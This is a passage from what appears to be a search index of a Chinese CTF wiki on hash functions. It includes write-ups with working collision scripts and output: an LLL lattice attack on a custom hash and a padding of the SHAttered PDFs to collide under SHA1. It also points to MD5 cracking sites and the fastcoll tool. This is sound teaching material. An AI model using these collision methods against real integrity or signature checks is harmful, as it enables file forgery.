\u4e2d\u7b2c\u4e8c\u4e2a\u4f8b\u5b50\u7684\u7b80\u5355\u60c5\u51b5\uff08\u53c2\u89c1\u683c\u95ee\u9898\u90e8\u5206\uff09\u3002 \u90a3\u4e48\u6211\u4eec\u53ef\u4ee5\u5feb\u901f\u6784\u9020\u77e9\u9635\uff0c\u5982\u4e0b A = \\left[ \\begin{matrix} 1 & 0 & 0 & \\cdots & 0 & Kg^{n-1} \\\\ 0 & 1 & 0 & \\cdots & 0 & Kg^{n-2} \\\\ 0 & 0 & 1 & \\cdots & 0 & Kg^{n-3} \\\\\\vdots & \\vdots & \\vdots & \\ddots & \\vdots \\\\ 0 & 0 &0 & \\cdots & 1 & K*mod \\\\ \\end{matrix} \\right] A = \\left[ \\begin{matrix} 1 & 0 & 0 & \\cdots & 0 & Kg^{n-1} \\\\ 0 & 1 & 0 & \\cdots & 0 & Kg^{n-2} \\\\ 0 & 0 & 1 & \\cdots & 0 & Kg^{n-3} \\\\\\vdots & \\vdots & \\vdots & \\ddots & \\vdots \\\\ 0 & 0 &0 & \\cdots & 1 & K*mod \\\\ \\end{matrix} \\right] \u4e4b\u540e\u6211\u4eec\u4f7f\u7528LLL \u7b97\u6cd5\u5373\u53ef\u83b7\u5f97\u4e24\u4e2a\u4e00\u6837\u7684\u54c8\u5e0c\u503c from sage.all import * mod = 2 ** 256 h0 = 45740974929179720441799381904411404011270459520712533273451053262137196814399 g = 2 ** 168 + 355 def shitty_hash ( msg ): h = h0 msg = map ( ord , msg ) for i in msg : h = ( h + i ) * g # This line is just to screw you up :)) h = h & 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff return h - 0xe6168647f636 K = 2 ** 200 N = 50 base_str = 'a' * N base = map ( ord , base_str ) m = Matrix ( ZZ , N + 1 , N + 2 ) for i in xrange ( N + 1 ): ge = ZZ ( pow ( g , N - i , mod )) m [ i , i ] = 1 m [ i , N + 1 ] = ZZ ( ge * K ) m [ i , N + 1 ] = ZZ ( K * mod ) ml = m . LLL () ttt = ml . rows ()[ 0 ] print \"result:\" , ttt if ttt [ - 1 ] != 0 : print \"Zero not reached, increase K\" exit () else : msg = [] for i in xrange ( N ): msg . append ( base [ i ] + ttt [ i ]) if not ( 0 <= msg [ i ] <= 255 ): print \"Need more bytes!\" quit () print msg other = '' . join ( map ( chr , msg )) print shitty_hash ( base_str ) print shitty_hash ( other ) \u6ce8\u610f\u4e0d\u80fd\u76f4\u63a5\u4ec5\u4ec5\u4f7f\u7528 pow(g, N - i, mod)\uff0c\u4e0d\u7136\u751f\u6210\u7684\u6570\u4f1a\u5728 mod \u5bf9\u5e94\u7684\u57df\u4e2d\uff0c\u8fd9\u771f\u662f\u4e2a\u5927\u5751\u3002 \u5982\u4e0b \u279c hashcoll sage exp.sage result: ( 15 , -14, 17 , 14 , 6 , 0 , 12 , 21 , 8 , 29 , 6 , -4, -9, 10 , -2, -12, -6, 0 , -12, 13 , -28, -28, -24, -3, 6 , -5, -16, 15 , 17 , -14, 3 , -2, -16, -25, 3 , -21, -27, -9, 16 , 5 , -1, 0 , -3, -4, -4, -19, 6 , 8 , 0 , 0 , 0 , 0 ) [ 112 , 83 , 114 , 111 , 103 , 97 , 109 , 118 , 105 , 126 , 103 , 93 , 88 , 107 , 95 , 85 , 91 , 97 , 85 , 110 , 69 , 69 , 73 , 94 , 103 , 92 , 81 , 112 , 114 , 83 , 100 , 95 , 81 , 72 , 100 , 76 , 70 , 88 , 113 , 102 , 96 , 97 , 94 , 93 , 93 , 78 , 103 , 105 , 97 , 97 ] 106025341237231370726407656306665079105509255639964756437758376184556498283725 106025341237231370726407656306665079105509255639964756437758376184556498283725 \u5373\u6210\u529f\u3002","title":"2018 \u7f51\u9f0e\u676f hashcoll"},{"location":"crypto/hash/introduction/","text":"\u54c8\u5e0c\u51fd\u6570 \u00b6 \u54c8\u5e0c\u51fd\u6570\uff08Hash Function\uff09\u628a\u6d88\u606f\u6216\u6570\u636e\u538b\u7f29\u6210\u6458\u8981\uff0c\u4f7f\u5f97\u6570\u636e\u91cf\u53d8\u5c0f\u3002\u5176\u4e00\u822c\u6a21\u578b\u5982\u4e0b \u663e\u7136\u5bf9\u4e8e\u4efb\u4f55\u4e00\u4e2ahash\u503c\uff0c\u7406\u8bba\u4e0a\u5b58\u5728\u82e5\u5e72\u4e2a\u6d88\u606f\u4e0e\u4e4b\u5bf9\u5e94\uff0c\u5373\u78b0\u649e\u3002 \u54c8\u5e0c\u51fd\u6570\u7684\u57fa\u672c\u9700\u6c42\u5982\u4e0b \u9700\u6c42 \u63cf\u8ff0 \u8f93\u5165\u957f\u5ea6\u53ef\u53d8 hash\u51fd\u6570\u53ef\u4ee5\u5e94\u7528\u4e8e\u4efb\u610f\u957f\u5ea6\u7684\u6570\u636e \u8f93\u51fa\u957f\u5ea6\u56fa\u5b9a hash\u51fd\u6570\u7684\u8f93\u51fa\u957f\u5ea6\u56fa\u5b9a \u6548\u7387 \u5bf9\u4e8e\u4efb\u610f\u6d88\u606f x x \uff0c\u8ba1\u7b97 H(x) H(x) \u5f88\u5bb9\u6613 \u5355\u5411\u6027 \u5bf9\u4e8e\u4efb\u610f\u54c8\u5e0c\u503ch\uff0c\u60f3\u8981\u627e\u5230\u6ee1\u8db3 H(x)=h H(x)=h \u7684x\u5728\u8ba1\u7b97\u4e0a\u4e0d\u53ef\u884c\u3002 \u6297\u5f31\u78b0\u649e\u6027 \u5bf9\u4e8e\u4efb\u610f\u6d88\u606fx\uff0c\u627e\u5230\u6ee1\u8db3\u53e6\u4e00\u6d88\u606fy\uff0c\u6ee1\u8db3 H(x)=H(y) H(x)=H(y) \uff0c\u5728\u8ba1\u7b97\u4e0a\u4e0d\u53ef\u884c\u3002 \u6297\u5f3a\u78b0\u649e\u6027 \u627e\u5230\u4efb\u610f\u4e00\u5bf9\u6ee1\u8db3 H(x)=H(y) H(x)=H(y) \u7684\u6d88\u606fx\u548cy\u5728\u8ba1\u7b97\u4e0a\u4e0d\u53ef\u884c\u3002 \u4f2a\u968f\u673a\u6027 \u54c8\u5e0c\u51fd\u6570\u7684\u8f93\u51fa\u6ee1\u8db3\u4f2a\u968f\u673a\u6027\u6d4b\u8bd5\u6807\u51c6\u3002 \u6563\u5217\u503c\u7684\u76ee\u7684\u5982\u4e0b \u786e\u4fdd\u6d88\u606f\u7684\u5b8c\u6574\u6027\uff0c\u5373\u786e\u4fdd\u6536\u5230\u7684\u6570\u636e\u786e\u5b9e\u548c\u53d1\u9001\u65f6\u7684\u4e00\u6837\uff08\u5373\u6ca1\u6709\u4fee\u6539\u3001\u63d2\u5165\u3001\u5220\u9664\u6216\u91cd\u653e\uff09\uff0c\u9632\u6b62\u4e2d\u95f4\u4eba\u7be1\u6539\u3002 \u5197\u4f59\u6821\u9a8c \u5355\u5411\u53e3\u4ee4\u6587\u4ef6\uff0c\u6bd4\u5982linux\u7cfb\u7edf\u7684\u5bc6\u7801 \u5165\u4fb5\u68c0\u6d4b\u548c\u75c5\u6bd2\u68c0\u6d4b\u4e2d\u7684\u7279\u5f81\u7801\u68c0\u6d4b \u76ee\u524d\u7684Hash\u51fd\u6570\u4e3b\u8981\u6709MD5\uff0cSHA1\uff0cSHA256\uff0cSHA512\u3002\u76ee\u524d\u7684\u5927\u591a\u6570hash\u51fd\u6570\u90fd\u662f\u8fed\u4ee3\u6027\u7684\uff0c\u5373\u4f7f\u7528\u540c\u4e00\u4e2ahash\u51fd\u6570\uff0c\u4e0d\u540c\u7684\u53c2\u6570\u8fdb\u884c\u591a\u6b21\u8fed\u4ee3\u8fd0\u7b97\u3002 \u7b97\u6cd5\u7c7b\u578b \u8f93\u51fa Hash \u503c\u957f\u5ea6 MD5 128 bit / 256 bit SHA1 160 bit SHA256 256 bit SHA512 512 bit","title":"\u54c8\u5e0c\u51fd\u6570"},{"location":"crypto/hash/introduction/#_1","text":"\u54c8\u5e0c\u51fd\u6570\uff08Hash Function\uff09\u628a\u6d88\u606f\u6216\u6570\u636e\u538b\u7f29\u6210\u6458\u8981\uff0c\u4f7f\u5f97\u6570\u636e\u91cf\u53d8\u5c0f\u3002\u5176\u4e00\u822c\u6a21\u578b\u5982\u4e0b \u663e\u7136\u5bf9\u4e8e\u4efb\u4f55\u4e00\u4e2ahash\u503c\uff0c\u7406\u8bba\u4e0a\u5b58\u5728\u82e5\u5e72\u4e2a\u6d88\u606f\u4e0e\u4e4b\u5bf9\u5e94\uff0c\u5373\u78b0\u649e\u3002 \u54c8\u5e0c\u51fd\u6570\u7684\u57fa\u672c\u9700\u6c42\u5982\u4e0b \u9700\u6c42 \u63cf\u8ff0 \u8f93\u5165\u957f\u5ea6\u53ef\u53d8 hash\u51fd\u6570\u53ef\u4ee5\u5e94\u7528\u4e8e\u4efb\u610f\u957f\u5ea6\u7684\u6570\u636e \u8f93\u51fa\u957f\u5ea6\u56fa\u5b9a hash\u51fd\u6570\u7684\u8f93\u51fa\u957f\u5ea6\u56fa\u5b9a \u6548\u7387 \u5bf9\u4e8e\u4efb\u610f\u6d88\u606f x x \uff0c\u8ba1\u7b97 H(x) H(x) \u5f88\u5bb9\u6613 \u5355\u5411\u6027 \u5bf9\u4e8e\u4efb\u610f\u54c8\u5e0c\u503ch\uff0c\u60f3\u8981\u627e\u5230\u6ee1\u8db3 H(x)=h H(x)=h \u7684x\u5728\u8ba1\u7b97\u4e0a\u4e0d\u53ef\u884c\u3002 \u6297\u5f31\u78b0\u649e\u6027 \u5bf9\u4e8e\u4efb\u610f\u6d88\u606fx\uff0c\u627e\u5230\u6ee1\u8db3\u53e6\u4e00\u6d88\u606fy\uff0c\u6ee1\u8db3 H(x)=H(y) H(x)=H(y) \uff0c\u5728\u8ba1\u7b97\u4e0a\u4e0d\u53ef\u884c\u3002 \u6297\u5f3a\u78b0\u649e\u6027 \u627e\u5230\u4efb\u610f\u4e00\u5bf9\u6ee1\u8db3 H(x)=H(y) H(x)=H(y) \u7684\u6d88\u606fx\u548cy\u5728\u8ba1\u7b97\u4e0a\u4e0d\u53ef\u884c\u3002 \u4f2a\u968f\u673a\u6027 \u54c8\u5e0c\u51fd\u6570\u7684\u8f93\u51fa\u6ee1\u8db3\u4f2a\u968f\u673a\u6027\u6d4b\u8bd5\u6807\u51c6\u3002 \u6563\u5217\u503c\u7684\u76ee\u7684\u5982\u4e0b \u786e\u4fdd\u6d88\u606f\u7684\u5b8c\u6574\u6027\uff0c\u5373\u786e\u4fdd\u6536\u5230\u7684\u6570\u636e\u786e\u5b9e\u548c\u53d1\u9001\u65f6\u7684\u4e00\u6837\uff08\u5373\u6ca1\u6709\u4fee\u6539\u3001\u63d2\u5165\u3001\u5220\u9664\u6216\u91cd\u653e\uff09\uff0c\u9632\u6b62\u4e2d\u95f4\u4eba\u7be1\u6539\u3002 \u5197\u4f59\u6821\u9a8c \u5355\u5411\u53e3\u4ee4\u6587\u4ef6\uff0c\u6bd4\u5982linux\u7cfb\u7edf\u7684\u5bc6\u7801 \u5165\u4fb5\u68c0\u6d4b\u548c\u75c5\u6bd2\u68c0\u6d4b\u4e2d\u7684\u7279\u5f81\u7801\u68c0\u6d4b \u76ee\u524d\u7684Hash\u51fd\u6570\u4e3b\u8981\u6709MD5\uff0cSHA1\uff0cSHA256\uff0cSHA512\u3002\u76ee\u524d\u7684\u5927\u591a\u6570hash\u51fd\u6570\u90fd\u662f\u8fed\u4ee3\u6027\u7684\uff0c\u5373\u4f7f\u7528\u540c\u4e00\u4e2ahash\u51fd\u6570\uff0c\u4e0d\u540c\u7684\u53c2\u6570\u8fdb\u884c\u591a\u6b21\u8fed\u4ee3\u8fd0\u7b97\u3002 \u7b97\u6cd5\u7c7b\u578b \u8f93\u51fa Hash \u503c\u957f\u5ea6 MD5 128 bit / 256 bit SHA1 160 bit SHA256 256 bit SHA512 512 bit","title":"\u54c8\u5e0c\u51fd\u6570"},{"location":"crypto/hash/md5/","text":"MD5 \u00b6 \u57fa\u672c\u63cf\u8ff0 \u00b6 MD5\u7684\u8f93\u5165\u8f93\u51fa\u5982\u4e0b \u8f93\u5165\uff1a\u4efb\u610f\u957f\u7684\u6d88\u606f\uff0c512\u6bd4\u7279\u957f\u7684\u5206\u7ec4\u3002 \u8f93\u51fa\uff1a128\u6bd4\u7279\u7684\u6d88\u606f\u6458\u8981\u3002 \u5173\u4e8e\u8be6\u7ec6\u7684\u4ecb\u7ecd\uff0c\u8bf7\u81ea\u884c\u641c\u7d22\u3002 \u6b64\u5916\uff0c\u6709\u65f6\u5019\u6211\u4eec\u83b7\u5f97\u5230\u7684md5\u662f16\u4f4d\u7684\uff0c\u5176\u5b9e\u90a316\u4f4d\u662f32\u4f4dmd5\u7684\u957f\u5ea6\uff0c\u662f\u4ece32\u4f4dmd5\u503c\u6765\u7684\u3002\u662f\u5c0632\u4f4dmd5\u53bb\u6389\u524d\u516b\u4f4d\uff0c\u53bb\u6389\u540e\u516b\u4f4d\u5f97\u5230\u7684\u3002 \u4e00\u822c\u6765\u8bf4\uff0c\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u51fd\u6570\u7684\u521d\u59cb\u5316\u6765\u5224\u65ad\u662f\u4e0d\u662fMD5\u51fd\u6570\u3002\u4e00\u822c\u6765\u8bf4\uff0c\u5982\u679c\u4e00\u4e2a\u51fd\u6570\u6709\u5982\u4e0b\u56db\u4e2a\u521d\u59cb\u5316\u7684\u53d8\u91cf\uff0c\u53ef\u4ee5\u731c\u6d4b\u8be5\u51fd\u6570\u4e3aMD5\u51fd\u6570\uff0c\u56e0\u4e3a\u8fd9\u662fMD5\u51fd\u6570\u7684\u521d\u59cb\u5316IV\u3002 0x67452301\uff0c0xEFCDAB89\uff0c0x98BADCFE\uff0c0x10325476 \u7834\u89e3 \u00b6 \u76ee\u524d\u53ef\u4ee5\u8bf4md5\u5df2\u7ecf\u57fa\u672c\u88ab\u653b\u7834\u4e86\uff0c\u4e00\u822c\u7684MD5\u7684\u78b0\u649e\u90fd\u53ef\u4ee5\u5728\u5982\u4e0b\u7f51\u4e0a\u83b7\u53d6\u5230 http://www.cmd5.com/ http://www.ttmd5.com/ http://pmd5.com/ https://www.win.tue.nl/hashclash/fastcoll_v1.0.0.5.exe.zip (\u751f\u6210\u6307\u5b9a\u524d\u7f00\u7684md5\u78b0\u649e) \u9898\u76ee \u00b6 CFF 2016 \u597d\u591a\u76d0 JarvisOJ \u597d\u591a\u76d0","title":"MD5"},{"location":"crypto/hash/md5/#md5","text":"","title":"MD5"},{"location":"crypto/hash/md5/#_1","text":"MD5\u7684\u8f93\u5165\u8f93\u51fa\u5982\u4e0b \u8f93\u5165\uff1a\u4efb\u610f\u957f\u7684\u6d88\u606f\uff0c512\u6bd4\u7279\u957f\u7684\u5206\u7ec4\u3002 \u8f93\u51fa\uff1a128\u6bd4\u7279\u7684\u6d88\u606f\u6458\u8981\u3002 \u5173\u4e8e\u8be6\u7ec6\u7684\u4ecb\u7ecd\uff0c\u8bf7\u81ea\u884c\u641c\u7d22\u3002 \u6b64\u5916\uff0c\u6709\u65f6\u5019\u6211\u4eec\u83b7\u5f97\u5230\u7684md5\u662f16\u4f4d\u7684\uff0c\u5176\u5b9e\u90a316\u4f4d\u662f32\u4f4dmd5\u7684\u957f\u5ea6\uff0c\u662f\u4ece32\u4f4dmd5\u503c\u6765\u7684\u3002\u662f\u5c0632\u4f4dmd5\u53bb\u6389\u524d\u516b\u4f4d\uff0c\u53bb\u6389\u540e\u516b\u4f4d\u5f97\u5230\u7684\u3002 \u4e00\u822c\u6765\u8bf4\uff0c\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u51fd\u6570\u7684\u521d\u59cb\u5316\u6765\u5224\u65ad\u662f\u4e0d\u662fMD5\u51fd\u6570\u3002\u4e00\u822c\u6765\u8bf4\uff0c\u5982\u679c\u4e00\u4e2a\u51fd\u6570\u6709\u5982\u4e0b\u56db\u4e2a\u521d\u59cb\u5316\u7684\u53d8\u91cf\uff0c\u53ef\u4ee5\u731c\u6d4b\u8be5\u51fd\u6570\u4e3aMD5\u51fd\u6570\uff0c\u56e0\u4e3a\u8fd9\u662fMD5\u51fd\u6570\u7684\u521d\u59cb\u5316IV\u3002 0x67452301\uff0c0xEFCDAB89\uff0c0x98BADCFE\uff0c0x10325476","title":"\u57fa\u672c\u63cf\u8ff0"},{"location":"crypto/hash/md5/#_2","text":"\u76ee\u524d\u53ef\u4ee5\u8bf4md5\u5df2\u7ecf\u57fa\u672c\u88ab\u653b\u7834\u4e86\uff0c\u4e00\u822c\u7684MD5\u7684\u78b0\u649e\u90fd\u53ef\u4ee5\u5728\u5982\u4e0b\u7f51\u4e0a\u83b7\u53d6\u5230 http://www.cmd5.com/ http://www.ttmd5.com/ http://pmd5.com/ https://www.win.tue.nl/hashclash/fastcoll_v1.0.0.5.exe.zip (\u751f\u6210\u6307\u5b9a\u524d\u7f00\u7684md5\u78b0\u649e)","title":"\u7834\u89e3"},{"location":"crypto/hash/md5/#_3","text":"CFF 2016 \u597d\u591a\u76d0 JarvisOJ \u597d\u591a\u76d0","title":"\u9898\u76ee"},{"location":"crypto/hash/sha1/","text":"SHA1 \u00b6 \u57fa\u672c\u63cf\u8ff0 \u00b6 SHA1\u7684\u8f93\u5165\u8f93\u51fa\u5982\u4e0b \u8f93\u5165\uff1a\u4efb\u610f\u957f\u7684\u6d88\u606f\uff0c\u5206\u4e3a 512 \u6bd4\u7279 \u957f\u7684\u5206\u7ec4\u3002\u9996\u5148\u5728\u6d88\u606f\u53f3\u4fa7\u8865\u6bd4\u7279 1\uff0c\u7136\u540e\u518d\u8865\u82e5\u5e72\u4e2a\u6bd4\u7279 0\uff0c\u76f4\u5230\u6d88\u606f\u7684\u6bd4\u7279\u957f\u5ea6\u6ee1\u8db3\u5bf9 512 \u53d6\u6a21\u540e\u4f59\u6570\u662f 448\uff0c\u4f7f\u5176\u4e0e 448 \u6a21 512 \u540c\u4f59\u3002 \u8f93\u51fa\uff1a160 \u6bd4\u7279\u7684\u6d88\u606f\u6458\u8981\u3002 \u5173\u4e8e\u8be6\u7ec6\u7684\u4ecb\u7ecd\uff0c\u8bf7\u81ea\u884c\u641c\u7d22\u3002 \u4e00\u822c\u6765\u8bf4\uff0c\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u51fd\u6570\u7684\u521d\u59cb\u5316\u6765\u5224\u65ad\u662f\u4e0d\u662f SHA1 \u51fd\u6570\u3002\u4e00\u822c\u6765\u8bf4\uff0c\u5982\u679c\u4e00\u4e2a\u51fd\u6570\u6709\u5982\u4e0b\u4e94\u4e2a\u521d\u59cb\u5316\u7684\u53d8\u91cf\uff0c\u53ef\u4ee5\u731c\u6d4b\u8be5\u51fd\u6570\u4e3a SHA1 \u51fd\u6570\uff0c\u56e0\u4e3a\u8fd9\u662f SHA1 \u51fd\u6570\u7684\u521d\u59cb\u5316IV\u3002 0x67452301 0xEFCDAB89 0x98BADCFE 0x10325476 0xC3D2E1F0 \u524d\u9762\u56db\u4e2a\u4e0e MD5 \u7c7b\u4f3c\uff0c\u540e\u9762\u7684\u662f\u65b0\u52a0\u7684\u3002 \u7834\u89e3 \u00b6 \u5c31\u76ee\u524d\u800c\u8a00\uff0cSHA1 \u5df2\u7ecf\u4e0d\u518d\u5b89\u5168\u4e86\uff0c\u56e0\u4e3a\u4e4b\u524d\u8c37\u6b4c\u516c\u5e03\u4e86\u6c42\u5f97\u4e24\u4e2a sha1 \u503c\u4e00\u6837\u7684 pdf\uff0c\u5177\u4f53\u8bf7\u53c2\u8003 shattered \u3002 \u8fd9\u91cc\u8fd8\u6709\u4e00\u4e2a\u6bd4\u8f83\u6709\u610f\u601d\u7684\u7f51\u7ad9\uff1a https://alf.nu/SHA1 \u3002 2017 SECCON SHA1 is dead \u00b6 \u9898\u76ee\u63cf\u8ff0\u5982\u4e0b file1 != file2 SHA1(file1) == SHA1(file2) SHA256(file1) <> SHA256(file2) 2017KiB < sizeof(file1) < 2018KiB 2017KiB < sizeof(file2) < 2018KiB \u5176\u4e2d 1KiB = 1024 bytes \u5373\u6211\u4eec\u9700\u8981\u627e\u5230\u4e24\u4e2a\u6587\u4ef6\u6ee1\u8db3\u4e0a\u8ff0\u7684\u7ea6\u675f\u3002 \u8fd9\u91cc\u7acb\u9a6c\u5c31\u60f3\u5230\u8c37\u6b4c\u4e4b\u524d\u516c\u5e03\u7684\u6587\u6863\uff0c\u800c\u4e14\uff0c\u975e\u5e38\u91cd\u8981\u7684\u662f\uff0c\u53ea\u8981\u4f7f\u7528\u7ed9\u5b9a\u7684\u524d 320 \u5b57\u8282\uff0c\u540e\u9762\u4efb\u610f\u6dfb\u52a0\u4e00\u6837\u7684\u5b57\u8282\u83b7\u53d6\u7684\u54c8\u5e0c\u4ecd\u7136\u4e00\u6837\uff0c\u8fd9\u91cc\u6211\u4eec\u6d4b\u8bd5\u5982\u4e0b \u279c 2017_seccon_sha1_is_dead git: ( master ) dd bs = 1 count = 320 <shattered-1.pdf | sha1sum \u8bb0\u5f55\u4e86320+0 \u7684\u8bfb\u5165 \u8bb0\u5f55\u4e86320+0 \u7684\u5199\u51fa 320 bytes copied, 0 .00796817 s, 40 .2 kB/s f92d74e3874587aaf443d1db961d4e26dde13e9c - \u279c 2017_seccon_sha1_is_dead git: ( master ) dd bs = 1 count = 320 <shattered-2.pdf | sha1sum \u8bb0\u5f55\u4e86320+0 \u7684\u8bfb\u5165 \u8bb0\u5f55\u4e86320+0 \u7684\u5199\u51fa 320 bytes copied, 0 .00397215 s, 80 .6 kB/s f92d74e3874587aaf443d1db961d4e26dde13e9c - \u8fdb\u800c\u6211\u4eec\u76f4\u63a5\u5199\u7a0b\u5e8f\u5373\u53ef\uff0c\u5982\u4e0b from hashlib import sha1 from hashlib import sha256 pdf1 = open ( './shattered-1.pdf' ) . read ( 320 ) pdf2 = open ( './shattered-2.pdf' ) . read ( 320 ) pdf1 = pdf1 . ljust ( 2017 * 1024 + 1 - 320 , \" \\00 \" ) #padding pdf to 2017Kib + 1 pdf2 = pdf2 . ljust ( 2017 * 1024 + 1 - 320 , \" \\00 \" ) open ( \"upload1\" , \"w\" ) . write ( pdf1 ) open ( \"upload2\" , \"w\" ) . write ( pdf2 ) print sha1 ( pdf1 ) . hexdigest () print sha1 ( pdf2 ) . hexdigest () print sha256 ( pdf1 ) . hexdigest () print sha256 ( pdf2 ) . hexdigest () \u53c2\u8003\u6587\u732e \u00b6 https://www.slideshare.net/herumi/googlesha1","title":"SHA1"},{"location":"crypto/hash/sha1/#sha1","text":"","title":"SHA1"},{"location":"crypto/hash/sha1/#_1","text":"SHA1\u7684\u8f93\u5165\u8f93\u51fa\u5982\u4e0b \u8f93\u5165\uff1a\u4efb\u610f\u957f\u7684\u6d88\u606f\uff0c\u5206\u4e3a 512 \u6bd4\u7279 \u957f\u7684\u5206\u7ec4\u3002\u9996\u5148\u5728\u6d88\u606f\u53f3\u4fa7\u8865\u6bd4\u7279 1\uff0c\u7136\u540e\u518d\u8865\u82e5\u5e72\u4e2a\u6bd4\u7279 0\uff0c\u76f4\u5230\u6d88\u606f\u7684\u6bd4\u7279\u957f\u5ea6\u6ee1\u8db3\u5bf9 512 \u53d6\u6a21\u540e\u4f59\u6570\u662f 448\uff0c\u4f7f\u5176\u4e0e 448 \u6a21 512 \u540c\u4f59\u3002 \u8f93\u51fa\uff1a160 \u6bd4\u7279\u7684\u6d88\u606f\u6458\u8981\u3002 \u5173\u4e8e\u8be6\u7ec6\u7684\u4ecb\u7ecd\uff0c\u8bf7\u81ea\u884c\u641c\u7d22\u3002 \u4e00\u822c\u6765\u8bf4\uff0c\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u51fd\u6570\u7684\u521d\u59cb\u5316\u6765\u5224\u65ad\u662f\u4e0d\u662f SHA1 \u51fd\u6570\u3002\u4e00\u822c\u6765\u8bf4\uff0c\u5982\u679c\u4e00\u4e2a\u51fd\u6570\u6709\u5982\u4e0b\u4e94\u4e2a\u521d\u59cb\u5316\u7684\u53d8\u91cf\uff0c\u53ef\u4ee5\u731c\u6d4b\u8be5\u51fd\u6570\u4e3a SHA1 \u51fd\u6570\uff0c\u56e0\u4e3a\u8fd9\u662f SHA1 \u51fd\u6570\u7684\u521d\u59cb\u5316IV\u3002 0x67452301 0xEFCDAB89 0x98BADCFE 0x10325476 0xC3D2E1F0 \u524d\u9762\u56db\u4e2a\u4e0e MD5 \u7c7b\u4f3c\uff0c\u540e\u9762\u7684\u662f\u65b0\u52a0\u7684\u3002","title":"\u57fa\u672c\u63cf\u8ff0"},{"location":"crypto/hash/sha1/#_2","text":"\u5c31\u76ee\u524d\u800c\u8a00\uff0cSHA1 \u5df2\u7ecf\u4e0d\u518d\u5b89\u5168\u4e86\uff0c\u56e0\u4e3a\u4e4b\u524d\u8c37\u6b4c\u516c\u5e03\u4e86\u6c42\u5f97\u4e24\u4e2a sha1 \u503c\u4e00\u6837\u7684 pdf\uff0c\u5177\u4f53\u8bf7\u53c2\u8003 shattered \u3002 \u8fd9\u91cc\u8fd8\u6709\u4e00\u4e2a\u6bd4\u8f83\u6709\u610f\u601d\u7684\u7f51\u7ad9\uff1a https://alf.nu/SHA1 \u3002","title":"\u7834\u89e3"},{"location":"crypto/hash/sha1/#2017-seccon-sha1-is-dead","text":"\u9898\u76ee\u63cf\u8ff0\u5982\u4e0b file1 != file2 SHA1(file1) == SHA1(file2) SHA256(file1) <> SHA256(file2) 2017KiB < sizeof(file1) < 2018KiB 2017KiB < sizeof(file2) < 2018KiB \u5176\u4e2d 1KiB = 1024 bytes \u5373\u6211\u4eec\u9700\u8981\u627e\u5230\u4e24\u4e2a\u6587\u4ef6\u6ee1\u8db3\u4e0a\u8ff0\u7684\u7ea6\u675f\u3002 \u8fd9\u91cc\u7acb\u9a6c\u5c31\u60f3\u5230\u8c37\u6b4c\u4e4b\u524d\u516c\u5e03\u7684\u6587\u6863\uff0c\u800c\u4e14\uff0c\u975e\u5e38\u91cd\u8981\u7684\u662f\uff0c\u53ea\u8981\u4f7f\u7528\u7ed9\u5b9a\u7684\u524d 320 \u5b57\u8282\uff0c\u540e\u9762\u4efb\u610f\u6dfb\u52a0\u4e00\u6837\u7684\u5b57\u8282\u83b7\u53d6\u7684\u54c8\u5e0c\u4ecd\u7136\u4e00\u6837\uff0c\u8fd9\u91cc\u6211\u4eec\u6d4b\u8bd5\u5982\u4e0b \u279c 2017_seccon_sha1_is_dead git: ( master ) dd bs = 1 count = 320 <shattered-1.pdf | sha1sum \u8bb0\u5f55\u4e86320+0 \u7684\u8bfb\u5165 \u8bb0\u5f55\u4e86320+0 \u7684\u5199\u51fa 320 bytes copied, 0 .00796817 s, 40 .2 kB/s f92d74e3874587aaf443d1db961d4e26dde13e9c - \u279c 2017_seccon_sha1_is_dead git: ( master ) dd bs = 1 count = 320 <shattered-2.pdf | sha1sum \u8bb0\u5f55\u4e86320+0 \u7684\u8bfb\u5165 \u8bb0\u5f55\u4e86320+0 \u7684\u5199\u51fa 320 bytes copied, 0 .00397215 s, 80 .6 kB/s f92d74e3874587aaf443d1db961d4e26dde13e9c - \u8fdb\u800c\u6211\u4eec\u76f4\u63a5\u5199\u7a0b\u5e8f\u5373\u53ef\uff0c\u5982\u4e0b from hashlib import sha1 from hashlib import sha256 pdf1 = open ( './shattered-1.pdf' ) . read ( 320 ) pdf2 = open ( './shattered-2.pdf' ) . read ( 320 ) pdf1 = pdf1 . ljust ( 2017 * 1024 + 1 - 320 , \" \\00 \" ) #padding pdf to 2017Kib + 1 pdf2 = pdf2 . ljust ( 2017 * 1024 + 1 - 320 , \" \\00 \" ) open ( \"upload1\" , \"w\" ) . write ( pdf1 ) open ( \"upload2\" , \"w\" ) . write ( pdf2 ) print sha1 ( pdf1 ) . hexdigest () print sha1 ( pdf2 ) . hexdigest () print sha256 ( pdf1 ) . hexdigest () print sha256 ( pdf2 ) . hexdigest ()","title":"2017 SECCON SHA1 is dead"},{"location":"crypto/hash/sha1/#_3","text":"https://www.slideshare.net/herumi/googlesha1","title":"\u53c2\u8003\u6587\u732e"},{"location":"crypto/signature/dsa/","text":"DSA \u00b6 \u4e0a\u9762\u6240\u63cf\u8ff0\u7684ElGamal\u7b7e\u540d\u7b97\u6cd5\u5728\u5b9e\u9645\u4e2d\u5e76\u4e0d\u5e38\u7528\uff0c\u66f4\u5e38\u7528\u7684\u662f\u5176\u53d8\u4f53DSA\u3002 \u57fa\u672c\u539f\u7406 \u00b6 \u5bc6\u94a5\u751f\u6210 \u00b6 \u9009\u62e9\u4e00\u4e2a\u5408\u9002\u7684\u54c8\u5e0c\u51fd\u6570\uff0c\u76ee\u524d\u4e00\u822c\u9009\u62e9SHA1\uff0c\u5f53\u524d\u4e5f\u53ef\u4ee5\u9009\u62e9\u5f3a\u5ea6\u66f4\u9ad8\u7684\u54c8\u5e0c\u51fd\u6570H\u3002 \u9009\u62e9\u5bc6\u94a5\u7684\u957f\u5ea6L\u548cN\uff0c\u8fd9\u4e24\u4e2a\u503c\u51b3\u5b9a\u4e86\u7b7e\u540d\u7684\u5b89\u5168\u7a0b\u5ea6\u3002\u5728\u6700\u521d\u7684DSS\uff08 Digital Signature Standard \uff09\u4e2d\u5efa\u8baeL\u5fc5\u987b\u4e3a64\u7684\u500d\u6570\uff0c\u5e76\u4e14 512 \\leq L \\leq 1024 512 \\leq L \\leq 1024 \uff0c\u5f53\u7136\uff0c\u4e5f\u53ef\u4ee5\u66f4\u5927\u3002N\u5fc5\u987b\u5927\u5c0f\u5fc5\u987b\u4e0d\u5927\u4e8e\u54c8\u5e0c\u51fd\u6570H\u8f93\u51fa\u7684\u957f\u5ea6\u3002FIPS 